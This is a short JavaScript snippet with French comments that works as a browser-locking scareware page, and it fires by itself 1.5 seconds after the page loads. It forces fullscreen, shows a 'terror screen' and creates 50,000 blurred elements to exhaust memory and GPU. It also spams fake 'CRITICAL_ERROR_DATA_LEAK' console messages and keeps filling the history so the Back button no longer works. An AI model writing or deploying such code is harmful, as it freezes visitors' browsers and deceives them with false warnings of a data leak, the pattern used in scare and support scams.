<script>
    function apocalypse() {
        // 1. Passage en plein écran forcé
        const doc = document.documentElement;
        if (doc.requestFullscreen) doc.requestFullscreen();

        // 2. Affichage de l'écran de terreur
        document.getElementById('meltdown-screen').style.display = 'flex';

        // 3. SATURATION DE LA RAM ET DU GPU (Le vrai bug)
        // On crée 50 000 éléments avec des calculs graphiques lourds
        const crashBox = document.createElement('div');
        document.body.appendChild(crashBox);
        
        for (let i = 0; i < 50000; i++) {
            let bug = document.createElement('div');
            // On lui donne des propriétés qui bouffent de la mémoire
            bug.style.boxShadow = "10px 10px 50px red";
            bug.style.filter = "blur(10px)";
            bug.style.width = "1px";
            bug.style.height = "1px";
            crashBox.appendChild(bug);
            
            // On sature la console en même temps
            console.log("CRITICAL_ERROR_DATA_LEAK_0x" + i.toString(16));
        }

        // 4. LE BLOCAGE FINAL
        // On utilise une récursion infinie (plus dur à bloquer qu'un while)
        function freeze() {
            history.pushState(null, null, location.href); // Remplit l'historique pour bloquer le bouton "Retour"
            setTimeout(freeze, 0);
        }
        freeze();
    }

    // Lancement automatique après 1 seconde de défilement de code
    window.onload = () => {
        setTimeout(apocalypse, 1500);
    };
</script>


